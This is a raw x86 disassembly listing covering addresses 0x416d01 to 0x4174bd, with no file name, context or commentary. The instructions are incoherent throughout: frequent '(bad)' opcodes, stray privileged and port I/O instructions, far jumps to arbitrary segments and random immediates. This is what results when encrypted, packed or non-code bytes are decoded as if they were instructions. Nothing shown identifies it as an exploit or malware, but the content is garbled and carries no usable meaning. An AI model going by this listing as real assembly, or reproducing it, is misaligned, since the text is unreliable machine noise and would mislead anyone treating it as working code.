  416d01:	iret   
  416d02:	adc    eax,0xd5e4bdc8
  416d07:	add    BYTE PTR gs:[edi+0x69],cl
  416d0b:	adc    DWORD PTR [esp+eax*2-0x68],0xffffffbd
  416d10:	xchg   ecx,eax
  416d11:	adc    esp,DWORD PTR [ecx+0x20a2bf30]
  416d17:	(bad)  
  416d18:	xor    BYTE PTR [edx-0x1e474352],dl
  416d1e:	adc    ebp,DWORD PTR [esi+eax*1-0x35]
  416d22:	xor    BYTE PTR [esi],ah
  416d24:	into   
  416d25:	inc    ebp
  416d26:	cmp    BYTE PTR [edi+0x4c],dh
  416d29:	push   edx
  416d2a:	nop
  416d2b:	mov    al,ds:0x1c9c2cfa
  416d30:	fcomp  DWORD PTR [esi-0x14]
  416d33:	ret    0x9f00
  416d36:	jo     0x416cff
  416d38:	and    DWORD PTR [ebp+0x49],eax
  416d3b:	and    ebp,esi
  416d3d:	sahf   
  416d3e:	loop   0x416cd2
  416d40:	cs in  al,0x71
  416d43:	popf   
  416d44:	pop    es
  416d45:	xchg   ebp,eax
  416d46:	push   edx
  416d47:	or     esi,eax
  416d49:	sbb    DWORD PTR [edx],esi
  416d4b:	sub    DWORD PTR [edi-0x65],ebx
  416d4e:	add    DWORD PTR [edx],0x44dc4c14
  416d54:	imul   esi,DWORD PTR [eax-0x125ae5a3],0xd044ec6
  416d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d5f:	(bad)  
  416d60:	fcomp  QWORD PTR [esi+0x79]
  416d63:	xor    BYTE PTR [ebx],bl
  416d65:	nop
  416d66:	mov    edx,0x3632ac05
  416d6b:	or     dl,cl
  416d6d:	out    dx,al
  416d6e:	xchg   esp,eax
  416d6f:	or     cl,BYTE PTR [eax+eax*2]
  416d72:	loop   0x416d70
  416d74:	adc    eax,0x24f4feb5
  416d79:	sbb    eax,0x90e67bc3
  416d7e:	inc    esi
  416d7f:	jle    0x416d02
  416d81:	(bad)  
  416d82:	imul   ecx,DWORD PTR [ecx],0xffffffe5
  416d85:	into   
  416d86:	(bad)  
  416d87:	xchg   esi,eax
  416d88:	add    bh,bh
  416d8a:	mov    dh,0x7c
  416d8c:	mov    al,ds:0xe7d0426c
  416d91:	es cli 
  416d93:	jg     0x416dea
  416d95:	xchg   edx,eax
  416d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d97:	mov    edx,0x667e27eb
  416d9c:	sbb    bl,0xa3
  416d9f:	mov    ebp,0xd5622887
  416da4:	xchg   ax,ax
  416da6:	enter  0x26a,0xd3
  416daa:	jo     0x416d30
  416dac:	iret   
  416dad:	das    
  416dae:	mov    edi,0x162ac198
  416db3:	or     eax,0x57d10ce3
  416db8:	cmp    al,0x9d
  416dba:	fsub   st,st(6)
  416dbc:	xchg   edx,eax
  416dbd:	fisttp WORD PTR [esi-0x27841be9]
  416dc3:	pop    ebp
  416dc4:	xor    eax,0x97c6e2d6
  416dc9:	lds    ebx,FWORD PTR [esi]
  416dcb:	out    0x53,al
  416dcd:	out    dx,eax
  416dce:	iret   
  416dcf:	popa   
  416dd0:	mov    ecx,0x2b238d8d
  416dd5:	fucomi st,st(1)
  416dd7:	add    bl,0x20
  416dda:	aas    
  416ddb:	test   DWORD PTR [esp+ebp*8],edx
  416dde:	shl    DWORD PTR [eax+0x3f],0xff
  416de2:	sbb    BYTE PTR [esi],al
  416de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de5:	sub    dh,bl
  416de7:	aad    0x3e
  416de9:	das    
  416dea:	xchg   ecx,eax
  416deb:	jae    0x416d9c
  416ded:	mov    edi,0x203f3348
  416df2:	adc    BYTE PTR [ebx+0x61],cl
  416df5:	ins    BYTE PTR es:[edi],dx
  416df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416df7:	shl    cl,1
  416df9:	(bad)  
  416dfa:	cld    
  416dfb:	bound  ecx,QWORD PTR [edx-0x64]
  416dfe:	inc    ebp
  416dff:	jge    0x416df4
  416e01:	cs fst st(7)
  416e04:	mov    ebp,0x281c8a0c
  416e09:	mov    DWORD PTR [ebx-0x1c3f7e0f],esi
  416e0f:	mov    esi,0xa1468b98
  416e14:	ja     0x416e8b
  416e16:	xchg   edx,eax
  416e17:	pop    esp
  416e18:	mov    cl,0xa4
  416e1a:	jne    0x416df6
  416e1c:	jl     0x416e77
  416e1e:	fnsave ds:0x3f0299cb
  416e24:	cwde   
  416e25:	(bad)  
  416e26:	sti    
  416e27:	jne    0x416dce
  416e29:	cs add eax,0x476f5570
  416e2f:	sub    eax,0xc6fa0ad2
  416e34:	ss pop esp
  416e36:	inc    edx
  416e37:	mov    cl,0x89
  416e39:	lods   al,BYTE PTR ds:[esi]
  416e3a:	sbb    al,0x6e
  416e3c:	push   edx
  416e3d:	jmp    0x9157:0xf1063ebb
  416e44:	leave  
  416e45:	xchg   esi,eax
  416e46:	in     eax,0x24
  416e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e49:	or     DWORD PTR [ecx+0x8993088],esp
  416e4f:	pop    eax
  416e50:	fsub   QWORD PTR [eax+eax*8]
  416e53:	push   es
  416e54:	fdivr  st(6),st
  416e56:	gs xchg edx,eax
  416e58:	dec    esp
  416e59:	sub    esp,DWORD PTR [ebx+eiz*2+0x663d97f4]
  416e60:	add    ebx,0xffffffe7
  416e63:	mov    WORD PTR [ecx],cs
  416e65:	xor    eax,0xe53e2ff7
  416e6a:	clc    
  416e6b:	cmp    eax,0x5a54fabb
  416e70:	inc    ebp
  416e71:	or     ah,al
  416e73:	sbb    edi,edx
  416e75:	pop    esp
  416e76:	dec    edx
  416e77:	in     eax,dx
  416e78:	xchg   edi,eax
  416e79:	rcr    ebp,cl
  416e7b:	lock into 
  416e7d:	sbb    eax,0x86396fc
  416e82:	icebp  
  416e83:	rcr    BYTE PTR [edx-0x2d],cl
  416e86:	cmp    dl,ah
  416e88:	or     eax,0x3c951c56
  416e8d:	push   eax
  416e8e:	repz (bad) 
  416e90:	pop    edx
  416e91:	pop    ss
  416e92:	mov    ebp,0x1e631c62
  416e97:	mov    cl,0x4
  416e99:	pop    esp
  416e9a:	jnp    0x416e20
  416e9c:	mov    ebp,0x6234247
  416ea1:	call   0xf15aa33f
  416ea6:	xchg   ebx,eax
  416ea7:	(bad)  
  416ea9:	sar    BYTE PTR [ebp+0x75],cl
  416eac:	pop    ecx
  416ead:	dec    esi
  416eae:	ret    0x6e89
  416eb1:	dec    ebx
  416eb2:	dec    edi
  416eb3:	mov    ebp,0xe555b4dc
  416eb8:	jae    0x416e7b
  416eba:	fstp   TBYTE PTR [edx]
  416ebc:	dec    ecx
  416ebd:	inc    ebp
  416ebe:	out    0xe8,eax
  416ec0:	aas    
  416ec1:	jb     0x7ece3878
  416ec7:	mov    ecx,0x84198b9b
  416ecc:	cdq    
  416ecd:	add    BYTE PTR [eax+ebx*1+0x6c],dh
  416ed1:	jns    0x416e59
  416ed3:	xchg   ebp,eax
  416ed4:	or     BYTE PTR [eax+ebx*1],0x4e
  416ed8:	jle    0x416e61
  416eda:	and    ebx,DWORD PTR [ecx]
  416edc:	fild   QWORD PTR [edi+0x4a]
  416edf:	push   edx
  416ee0:	cdq    
  416ee1:	scas   eax,DWORD PTR es:[edi]
  416ee2:	ja     0x416e8d
  416ee4:	cmc    
  416ee5:	cmp    DWORD PTR [edx+0x25],esi
  416ee8:	cld    
  416ee9:	pop    ss
  416eea:	fisub  WORD PTR [eax]
  416eec:	lahf   
  416eed:	stos   BYTE PTR es:[edi],al
  416eee:	in     al,dx
  416eef:	test   eax,0xca810393
  416ef4:	lock cld 
  416ef6:	addr16 aam 0xdd
  416ef9:	fnsave [ebp-0x43]
  416efc:	and    al,0xa9
  416efe:	add    BYTE PTR [ecx+esi*4-0x7297aea0],dh
  416f05:	sub    BYTE PTR [edi-0x2ffd86b9],bh
  416f0b:	jnp    0x416eb3
  416f0d:	mov    ah,0xc2
  416f0f:	pop    ecx
  416f10:	test   DWORD PTR [ebp+0x42],ecx
  416f13:	daa    
  416f14:	stos   BYTE PTR es:[edi],al
  416f15:	push   es
  416f16:	add    esp,eax
  416f18:	gs retf 0x1c8e
  416f1c:	fiadd  WORD PTR [ebx-0x5c574d42]
  416f22:	pop    ds
  416f23:	stos   BYTE PTR es:[edi],al
  416f24:	gs push eax
  416f27:	lods   al,BYTE PTR ds:[esi]
  416f28:	daa    
  416f29:	mov    bl,0xf3
  416f2b:	lea    ecx,[ebp-0x41]
  416f2e:	or     esp,DWORD PTR [esi]
  416f30:	out    0x5c,al
  416f32:	pushw  0xc218
  416f36:	cmp    DWORD PTR [edx+0x6f],edi
  416f39:	nop
  416f3a:	sub    edi,DWORD PTR [ecx+0x37]
  416f3d:	push   ebp
  416f3e:	out    0x38,al
  416f40:	ins    DWORD PTR es:[edi],dx
  416f41:	and    al,cl
  416f43:	test   al,0x40
  416f45:	out    0x1f,eax
  416f47:	sbb    bh,BYTE PTR [edi]
  416f49:	fucomip st,st(5)
  416f4b:	lods   eax,DWORD PTR ds:[esi]
  416f4c:	dec    edx
  416f4d:	cmp    ebx,DWORD PTR [ebx]
  416f4f:	popf   
  416f50:	push   0x937c8bd7
  416f55:	inc    ecx
  416f56:	cmp    DWORD PTR [edx-0x450d2298],ebp
  416f5c:	pop    ecx
  416f5d:	mov    ebp,0xb9970661
  416f62:	mov    dh,0xdc
  416f64:	mov    cs,WORD PTR [ecx]
  416f66:	push   esp
  416f67:	inc    edi
  416f68:	inc    ebp
  416f69:	or     eax,0x85af5304
  416f6e:	(bad)  
  416f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f70:	inc    ecx
  416f71:	scas   al,BYTE PTR es:[edi]
  416f72:	add    bh,al
  416f74:	inc    esp
  416f75:	test   DWORD PTR [esi],0x7b2adaba
  416f7b:	jmp    0xe64f97df
  416f80:	out    0x18,al
  416f82:	(bad)  
  416f83:	rcr    DWORD PTR [ebx],1
  416f85:	inc    ecx
  416f86:	loopne 0x416f96
  416f88:	mov    ds:0x636a8b6c,al
  416f8d:	adc    eax,0x64a7caaa
  416f92:	adc    BYTE PTR [edi-0x75],ah
  416f95:	or     eax,0x97d9b3bd
  416f9a:	pop    ss
  416f9b:	inc    edi
  416f9c:	std    
  416f9d:	jg     0x417001
  416f9f:	xchg   esp,eax
  416fa0:	(bad)  
  416fa2:	aas    
  416fa3:	retf   
  416fa4:	in     al,0xf9
  416fa6:	sbb    al,0x5d
  416fa8:	push   cs
  416fa9:	lock dec edx
  416fab:	inc    eax
  416fac:	addr16 pusha 
  416fae:	cld    
  416faf:	mov    bl,0x8e
  416fb1:	jl     0x416fb9
  416fb3:	mov    dh,0xca
  416fb5:	adc    eax,0xc5e48094
  416fba:	ja     0x416f59
  416fbc:	int3   
  416fbd:	mov    ebx,0x194d37db
  416fc2:	dec    edi
  416fc3:	out    0xf0,eax
  416fc5:	mov    al,0xec
  416fc7:	dec    ebx
  416fc8:	test   DWORD PTR [ebx-0x4a],0x20bfe3c2
  416fcf:	pop    esp
  416fd0:	ds dec ebp
  416fd2:	shr    ebx,cl
  416fd4:	scas   al,BYTE PTR es:[edi]
  416fd5:	jno    0x41702f
  416fd7:	jl     0x416f97
  416fd9:	xor    dh,BYTE PTR [ebx-0x6c52115c]
  416fdf:	int3   
  416fe0:	or     BYTE PTR [ebx+0x63b091c0],bh
  416fe6:	out    dx,eax
  416fe7:	and    DWORD PTR [edx-0xf],esp
  416fea:	pop    es
  416feb:	aaa    
  416fec:	pop    esi
  416fed:	lds    ebp,FWORD PTR fs:[ecx-0x6237f86]
  416ff4:	stos   DWORD PTR es:[edi],eax
  416ff5:	shl    DWORD PTR [edx-0x5d],1
  416ff8:	ficom  DWORD PTR [eax+0x7b]
  416ffb:	fistp  DWORD PTR [esi]
  416ffd:	xchg   esp,eax
  416ffe:	sub    ecx,ebx
  417000:	sub    dh,dl
  417002:	adc    edi,DWORD PTR [edi+ebp*1-0x23]
  417006:	adc    BYTE PTR [ecx],0x20
  417009:	ja     0x416fd3
  41700b:	inc    esi
  41700c:	les    esp,FWORD PTR [eax+0x58]
  41700f:	mov    esi,0x7ac08962
  417014:	repz push ds
  417016:	push   ecx
  417017:	or     ch,ah
  417019:	push   edi
  41701a:	loope  0x41707a
  41701c:	jl     0x417078
  41701e:	sbb    BYTE PTR [edx+0x44],bl
  417021:	cmp    esi,esi
  417023:	inc    ebx
  417024:	adc    eax,0x91f67c79
  417029:	mov    esp,ebp
  41702b:	bound  esp,QWORD PTR [edi]
  41702d:	dec    ebx
  41702e:	xchg   esp,eax
  41702f:	sbb    ebx,DWORD PTR [ebx+0x23]
  417032:	sub    eax,esi
  417034:	sub    ebx,ebx
  417036:	fisttp QWORD PTR [eax]
  417038:	ins    DWORD PTR es:[edi],dx
  417039:	out    dx,eax
  41703a:	mov    bh,0xba
  41703c:	dec    esp
  41703d:	or     BYTE PTR [ebx],al
  41703f:	gs int3 
  417041:	cs lock (bad) 
  417044:	mov    ds:0x95c85129,al
  417049:	or     dh,BYTE PTR [edi+0x5b940075]
  41704f:	xchg   ecx,eax
  417050:	fadd   DWORD PTR [edx+0x325be840]
  417056:	sub    al,0x8e
  417058:	add    dh,0xe8
  41705b:	les    ebp,FWORD PTR [ecx-0x5c]
  41705e:	hlt    
  41705f:	mov    ebx,0xadc3e646
  417064:	xchg   ecx,eax
  417065:	lds    eax,FWORD PTR [edi+0x3693bd71]
  41706b:	and    ecx,DWORD PTR [esi+0x14]
  41706e:	(bad)  [ebx]
  417070:	sbb    DWORD PTR [ebx+eiz*1+0x7b4d697f],ebp
  417077:	or     ecx,DWORD PTR [eax+0x6f]
  41707a:	mov    eax,0x9098576f
  41707f:	mov    bl,0x28
  417081:	jb     0x4170e1
  417083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417084:	outs   dx,DWORD PTR ds:[esi]
  417085:	test   al,0x2a
  417087:	push   eax
  417088:	dec    edx
  417089:	inc    ecx
  41708a:	adc    DWORD PTR [eax],esi
  41708c:	or     DWORD PTR [eax],edx
  41708e:	jle    0x41704c
  417090:	mov    ds:0xa77db81d,al
  417095:	mov    al,0x6d
  417097:	aas    
  417098:	xchg   esp,eax
  417099:	sub    bl,ah
  41709b:	dec    edi
  41709c:	dec    ebx
  41709d:	sar    BYTE PTR [edi-0x70efdf67],1
  4170a3:	int3   
  4170a4:	mov    eax,ds:0xd088762f
  4170a9:	pop    ss
  4170aa:	pop    ds
  4170ab:	loop   0x4170a0
  4170ad:	sbb    BYTE PTR [esi],ah
  4170af:	dec    ebx
  4170b0:	jmp    0x835d:0xfee74a3c
  4170b7:	push   ebp
  4170b8:	xor    esp,DWORD PTR [esi]
  4170ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170bb:	out    0x80,eax
  4170bd:	cdq    
  4170be:	pop    esp
  4170bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c0:	ins    BYTE PTR es:[edi],dx
  4170c1:	sahf   
  4170c2:	cdq    
  4170c3:	xchg   ecx,eax
  4170c4:	lea    eax,[esi+0x2a88a053]
  4170ca:	jae    0x4170f1
  4170cc:	xlat   BYTE PTR ds:[ebx]
  4170cd:	or     eax,0x83ef336b
  4170d2:	jle    0x4170df
  4170d4:	lods   al,BYTE PTR ds:[esi]
  4170d5:	jl     0x4170b9
  4170d7:	sbb    DWORD PTR [esi+esi*4-0x486f9c30],edx
  4170de:	outs   dx,BYTE PTR fs:[esi]
  4170e0:	xchg   esi,eax
  4170e1:	or     DWORD PTR [edi+0x0],eax
  4170e4:	cmp    DWORD PTR [ecx-0x4b86b5ca],ecx
  4170ea:	mov    al,0x8e
  4170ec:	sbb    BYTE PTR [edx],ah
  4170ee:	or     BYTE PTR [edi],bh
  4170f0:	pop    ebx
  4170f1:	push   esp
  4170f2:	mov    edi,DWORD PTR [ecx+0x61]
  4170f5:	mov    WORD PTR [edi-0x58],fs
  4170f8:	pop    ebx
  4170f9:	iret   
  4170fa:	aaa    
  4170fb:	mov    edi,0xff345f73
  417100:	in     al,dx
  417101:	jge    0x41710d
  417103:	movntq QWORD PTR [edx],mm6
  417106:	push   eax
  417107:	das    
  417108:	inc    ecx
  417109:	inc    edx
  41710a:	sbb    ch,BYTE PTR [edx]
  41710c:	cmp    BYTE PTR [edx-0x3e],0x5e
  417110:	mov    bl,0xee
  417112:	test   eax,0x90550fbc
  417117:	not    DWORD PTR [ecx-0xf]
  41711a:	mov    edi,DWORD PTR [ecx-0x36]
  41711d:	xor    eax,0x90c325cc
  417122:	push   edi
  417123:	pop    ebx
  417124:	mov    esp,0x866c3fa2
  417129:	inc    ebx
  41712a:	dec    edx
  41712b:	jmp    0x46f5fe04
  417130:	daa    
  417131:	inc    eax
  417132:	test   ch,bh
  417134:	push   edx
  417135:	mov    ch,bl
  417137:	mov    cl,0x60
  417139:	or     DWORD PTR [edi+0x41b790be],eax
  41713f:	xchg   ecx,eax
  417140:	ja     0x4170f4
  417142:	rcl    BYTE PTR ds:0xde62c416,0x42
  417149:	loop   0x4171ae
  41714b:	push   esi
  41714c:	push   ebp
  41714d:	pop    ebp
  41714e:	retf   0xf2b3
  417151:	in     eax,0xd5
  417153:	das    
  417154:	jl     0x41713b
  417156:	int    0x55
  417158:	aam    0xa1
  41715a:	popa   
  41715b:	addr16 mov ds:0x4d80,eax
  41715f:	jmp    ecx
  417161:	(bad)  
  417162:	nop
  417163:	mov    BYTE PTR es:[eax+0x29],0xd8
  417168:	push   es
  417169:	pusha  
  41716a:	loopne 0x41711e
  41716c:	out    dx,eax
  41716d:	mov    bh,0x8c
  41716f:	or     eax,0x23383bc1
  417174:	retf   0xcf33
  417177:	inc    ebp
  417178:	xor    eax,0xc77636d
  41717d:	outs   dx,DWORD PTR ds:[esi]
  41717e:	ret    0x99cd
  417181:	test   eax,0x78126411
  417186:	iret   
  417187:	xor    BYTE PTR [eax+0x33],al
  41718a:	inc    ebp
  41718b:	sbb    BYTE PTR [esp+eax*1-0x6a],0xcc
  417190:	mov    ds:0xc52a0cf0,al
  417195:	sub    al,0xfa
  417197:	dec    edi
  417198:	xor    cl,ch
  41719a:	pop    esi
  41719b:	fld    DWORD PTR [esi]
  41719d:	fld    QWORD PTR [eax-0x30e4ec7f]
  4171a3:	sete   BYTE PTR [edi-0x41]
  4171a7:	data16 (bad) 
  4171aa:	push   ebp
  4171ab:	loopne 0x41720e
  4171ad:	in     eax,dx
  4171ae:	test   al,0xdc
  4171b0:	xlat   BYTE PTR ds:[ebx]
  4171b1:	push   esp
  4171b2:	xchg   ecx,eax
  4171b3:	sar    ebp,0x2f
  4171b6:	in     eax,0xcd
  4171b8:	stos   DWORD PTR es:[edi],eax
  4171b9:	inc    DWORD PTR [edx+0x794fc04d]
  4171bf:	popf   
  4171c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171c1:	and    eax,DWORD PTR [ebx+0x1adb7091]
  4171c7:	cmp    bh,BYTE PTR [ecx-0x2a]
  4171ca:	pushf  
  4171cb:	mov    cl,0x30
  4171cd:	in     al,0x9d
  4171cf:	push   0x79ffd0b5
  4171d4:	arpl   WORD PTR [ebx-0x1dd65577],bp
  4171da:	in     eax,0x30
  4171dc:	test   DWORD PTR [ecx+0x5f59f0db],edx
  4171e2:	cmp    ebx,DWORD PTR [ebx-0x71b7c276]
  4171e8:	out    dx,eax
  4171e9:	dec    ecx
  4171ea:	xchg   esi,eax
  4171ec:	jns    0x4171d6
  4171ee:	or     esi,ecx
  4171f0:	push   esp
  4171f1:	js     0x417266
  4171f3:	ja     0x4171cb
  4171f5:	repz xchg esp,eax
  4171f7:	mov    bh,al
  4171f9:	and    ecx,DWORD PTR [eax+eiz*1]
  4171fc:	(bad)  
  4171fd:	cwde   
  4171fe:	ror    ch,cl
  417200:	dec    esi
  417201:	jmp    0x235748fa
  417206:	das    
  417207:	push   ds
  417208:	inc    edx
  417209:	add    al,0x8c
  41720b:	cs sub eax,0x613f2c0f
  417211:	and    al,0x44
  417213:	arpl   WORD PTR [edi],sp
  417215:	dec    ecx
  417216:	xor    dl,BYTE PTR [eax-0x3cfc9fe7]
  41721c:	sub    eax,0x1a70d225
  417221:	mov    DWORD PTR [eax],0x46edf3b5
  417227:	sub    DWORD PTR [edx+ecx*8],esi
  41722a:	or     cl,cl
  41722c:	and    al,0x71
  41722e:	sahf   
  41722f:	and    bh,BYTE PTR [esi-0x8957cc0]
  417235:	push   0xffffffff
  417237:	jns    0x417280
  417239:	xchg   esp,eax
  41723a:	fcmovnb st,st(6)
  41723c:	dec    ebx
  41723d:	or     BYTE PTR [ebp+0x760459ad],cl
  417243:	push   0xb843e417
  417248:	jno    0x417282
  41724a:	xor    eax,0x5b92c6a8
  41724f:	xor    eax,0xc4bd6855
  417254:	push   edx
  417255:	and    BYTE PTR [edx-0x67],bl
  417258:	xor    cl,BYTE PTR [ebp-0x45]
  41725b:	push   ecx
  41725c:	mov    cl,0xcc
  41725e:	out    0x8,al
  417260:	pusha  
  417261:	jecxz  0x417243
  417263:	push   cs
  417264:	ret    0x2d0d
  417267:	cs mov edi,0xc1431120
  41726d:	popf   
  41726e:	fcmovne st,st(2)
  417270:	sub    al,0xb
  417272:	loopne 0x417258
  417274:	fwait
  417275:	call   0x57b:0x561a22cb
  41727c:	inc    edx
  41727d:	push   ebp
  41727e:	push   0xfffffffc
  417280:	(bad)  
  417281:	pushf  
  417282:	sbb    ch,BYTE PTR [ebx+edi*8]
  417285:	sub    eax,0x1bef0fb1
  41728a:	call   0x7b4:0x65ca7d3a
  417291:	js     0x4172f0
  417293:	push   edi
  417294:	mov    bh,0x14
  417296:	xor    BYTE PTR ds:0x115d2e13,ch
  41729c:	push   cs
  41729d:	stc    
  41729e:	push   esp
  41729f:	mov    DWORD PTR [ecx],eax
  4172a1:	adc    eax,DWORD PTR [edx-0x61721484]
  4172a7:	xchg   edi,eax
  4172a8:	xor    eax,0x98055c1b
  4172ad:	jl     0x4172ad
  4172af:	dec    ebp
  4172b0:	imul   edi,DWORD PTR es:[ebp-0x7b],0xd031848f
  4172b8:	imul   esp,DWORD PTR [esi],0x52
  4172bb:	pop    eax
  4172bc:	stc    
  4172bd:	cmp    eax,0x8c82722f
  4172c2:	cmc    
  4172c3:	in     al,dx
  4172c4:	add    BYTE PTR [ecx],bl
  4172c6:	pop    es
  4172c7:	xchg   esp,eax
  4172c8:	(bad)  
  4172c9:	std    
  4172ca:	sub    edi,DWORD PTR [ecx+0xd8f56f6]
  4172d0:	out    dx,eax
  4172d1:	sbb    BYTE PTR [esi+0x34],bl
  4172d4:	sub    BYTE PTR [edx-0x7e],0x34
  4172d8:	nop
  4172d9:	clc    
  4172da:	push   esp
  4172db:	jp     0x41729b
  4172dd:	call   0x60c3:0x91481af4
  4172e4:	adc    BYTE PTR [ecx+0x6d0d9039],0x1
  4172eb:	ret    
  4172ec:	cmp    BYTE PTR [edx],bl
  4172ee:	xchg   BYTE PTR [edx+0x3a],dh
  4172f1:	push   ds
  4172f2:	loope  0x41734b
  4172f4:	ins    DWORD PTR es:[edi],dx
  4172f5:	in     al,dx
  4172f6:	or     dh,BYTE PTR [edi]
  4172f8:	or     eax,ebp
  4172fa:	cld    
  4172fb:	sub    BYTE PTR [ebp+0x52],cl
  4172fe:	ins    DWORD PTR es:[edi],dx
  4172ff:	jno    0x417331
  417301:	mov    ebp,0xc515a0bc
  417306:	inc    eax
  417307:	ds push eax
  41730a:	xor    eax,0x57b728cc
  41730f:	inc    ebx
  417310:	and    dh,BYTE PTR [esp+esi*4+0x16]
  417314:	inc    bl
  417316:	inc    esp
  417317:	xchg   ebx,eax
  417318:	pop    eax
  417319:	mov    bl,0xe1
  41731b:	jmp    0xf258:0x9a95da3a
  417322:	fidivr WORD PTR [edx+ebp*8-0x3b]
  417326:	jg     0x41730e
  417328:	mov    esi,0x865627b1
  41732d:	enter  0xc44a,0x54
  417331:	mov    al,0x66
  417333:	data16 aad 0xa7
  417336:	sub    DWORD PTR fs:[ebx+eax*1+0x2f],esi
  41733b:	pop    ss
  41733c:	test   eax,0x18935445
  417341:	pop    eax
  417342:	lods   al,BYTE PTR ds:[esi]
  417343:	sbb    eax,0x468cb7c7
  417348:	call   0x65fa47bd
  41734d:	xchg   ecx,eax
  41734e:	xor    ebx,DWORD PTR [eax]
  417350:	push   esi
  417351:	or     eax,0x474cf995
  417356:	test   BYTE PTR [edi],dh
  417358:	loope  0x417338
  41735a:	dec    edi
  41735b:	scas   al,BYTE PTR es:[edi]
  41735c:	test   BYTE PTR [ecx-0x697fc495],cl
  417362:	hlt    
  417363:	dec    cl
  417365:	dec    ecx
  417366:	inc    edi
  417367:	and    ecx,edx
  417369:	imul   edx,DWORD PTR [ecx+0x1],0xd83a1880
  417370:	jmp    0x7215d292
  417375:	stos   DWORD PTR es:[edi],eax
  417376:	bound  esi,QWORD PTR [ebx-0xb]
  417379:	call   0xccd920b8
  41737e:	jmp    0x1babd0ce
  417383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417384:	fnsave [eax+0x5fd520fb]
  41738a:	add    edx,DWORD PTR [ecx]
  41738c:	in     al,dx
  41738d:	retf   
  41738e:	leave  
  41738f:	xchg   DWORD PTR [eax],esi
  417391:	inc    edx
  417392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417393:	jecxz  0x417319
  417395:	aad    0x4d
  417397:	dec    ecx
  417398:	pop    edx
  417399:	outs   dx,BYTE PTR ds:[esi]
  41739a:	es and al,0x66
  41739d:	mov    esi,0x4b40383d
  4173a2:	ja     0x417328
  4173a4:	and    BYTE PTR [ebx-0xd],0x9d
  4173a8:	sbb    ah,BYTE PTR [edx+0x79]
  4173ab:	adc    al,0xba
  4173ad:	fwait
  4173ae:	mov    al,ds:0x79549d7d
  4173b3:	jmp    0x4173b7
  4173b5:	adc    DWORD PTR [ebx-0x16045e73],eax
  4173bb:	jmp    0xb59488ac
  4173c0:	xchg   edx,eax
  4173c1:	gs push ebx
  4173c3:	sub    edx,eax
  4173c5:	adc    ch,dl
  4173c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c8:	rcl    BYTE PTR [esi],cl
  4173ca:	adc    esi,ecx
  4173cc:	push   cs
  4173cd:	enter  0x8655,0x72
  4173d1:	cmp    BYTE PTR ds:[esi-0x6d6e1807],ch
  4173d8:	arpl   bp,di
  4173da:	mov    db7,edx
  4173dd:	enter  0x63f1,0xf8
  4173e1:	inc    ebx
  4173e2:	fwait
  4173e3:	clc    
  4173e4:	mov    bh,0xa9
  4173e6:	push   ss
  4173e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e8:	sub    eax,0xf0c0bbc2
  4173ed:	push   0x77
  4173ef:	push   ss
  4173f0:	xchg   ecx,eax
  4173f1:	out    dx,al
  4173f2:	lds    edx,FWORD PTR [ebp+ebp*2-0x52a38cb8]
  4173f9:	(bad)  
  4173fc:	adc    al,0x2f
  4173fe:	sbb    BYTE PTR [eax+0x6e968773],bl
  417404:	out    dx,al
  417405:	stc    
  417406:	int    0x5f
  417408:	jnp    0x4173c3
  41740a:	(bad)  
  41740b:	dec    esp
  41740c:	dec    ebp
  41740d:	jo     0x4173a8
  41740f:	adc    DWORD PTR [ebp+0x510c869],eax
  417415:	ins    BYTE PTR es:[edi],dx
  417416:	out    0x2f,eax
  417418:	sbb    al,0x15
  41741a:	mov    fs,WORD PTR [ecx]
  41741c:	(bad)  
  41741d:	iret   
  41741e:	pop    edi
  41741f:	mov    WORD PTR ds:0x662a8d27,es
  417425:	pusha  
  417426:	xchg   cl,dh
  417428:	in     eax,dx
  417429:	pop    edx
  41742a:	mov    al,0x6f
  41742c:	inc    eax
  41742d:	and    esi,esp
  41742f:	cmp    eax,0x90efaef1
  417434:	add    ah,al
  417436:	pop    esp
  417437:	outs   dx,BYTE PTR ds:[esi]
  417438:	sbb    DWORD PTR ds:0xc7d168e7,ebp
  41743e:	mov    esi,0x163508a8
  417443:	xchg   bl,bh
  417445:	mov    ebx,DWORD PTR [eax]
  417447:	and    BYTE PTR [ebx-0xf776f2e],bh
  41744d:	mov    ds:0xeb8bed4f,eax
  417452:	lock std 
  417454:	sub    al,0x77
  417456:	sub    al,0x4b
  417458:	jecxz  0x41744b
  41745a:	sub    dl,BYTE PTR [edi]
  41745c:	leave  
  41745d:	mov    ebp,0x2c46dcf
  417462:	gs loope 0x41745f
  417465:	js     0x417489
  417467:	inc    ecx
  417468:	adc    eax,0x6d6e88f6
  41746d:	(bad)  
  417470:	mov    eax,DWORD PTR [edi]
  417472:	sbb    DWORD PTR [ebp-0x1e],0xffffff8d
  417476:	or     eax,0xfb949e79
  41747b:	das    
  41747c:	jb     0x417431
  41747e:	popf   
  41747f:	xchg   ecx,eax
  417480:	out    0xb2,eax
  417482:	cmp    dh,BYTE PTR [edi+0x667904ce]
  417488:	pop    edi
  417489:	aam    0xbb
  41748b:	cmp    bh,BYTE PTR [eax-0x55]
  41748e:	push   eax
  41748f:	push   ss
  417490:	psraw  mm4,QWORD PTR [ecx+0x11a1d002]
  417497:	mov    ss,WORD PTR [edx+edi*2+0x300aab73]
  41749e:	sub    ch,BYTE PTR [edx+0x72]
  4174a1:	jno    0x417495
  4174a3:	dec    edi
  4174a4:	or     eax,DWORD PTR [edi-0x2010c302]
  4174aa:	fwait
  4174ab:	inc    ebp
  4174ac:	jnp    0x4174ef
  4174ae:	jno    0x41746d
  4174b0:	or     ecx,DWORD PTR [eax-0x51269a1b]
  4174b6:	sbb    al,0x1e
  4174b8:	jle    0x417472
  4174ba:	sub    al,dh
  4174bc:	(bad)  
  4174bd:	lock and eax,0x7a96cc1b
